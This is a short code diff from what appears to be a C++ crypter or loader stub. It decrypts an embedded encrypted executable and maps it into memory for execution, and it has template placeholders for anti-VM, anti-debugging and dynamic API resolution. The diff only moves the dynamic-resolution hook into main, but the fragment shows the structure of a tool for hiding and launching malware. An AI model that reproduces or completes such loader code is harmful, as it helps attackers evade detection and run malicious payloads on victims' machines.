@@ -42,8 +42,6 @@ vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<uns
 }
 void execute(const vector<unsigned char> &payload) {
 
-    /*DYN_RESOLUTION*/
-
     // Get DOS and NT Headers from the payload, e_lfanew is the offset start of the exe
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);
@@ -223,12 +221,11 @@ const vector<unsigned char> KEY = { /*KEY*/ };
 const vector<unsigned char> IV = { /*IV*/ };
 
 int main() {
+    /*DYN_CALL*/
     /*VM_CALL*/
     /*DB_CALL*/
     vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
-    
     execute(payload);
-    
     if(DEBUG){cin.get();}
 
     return 0;
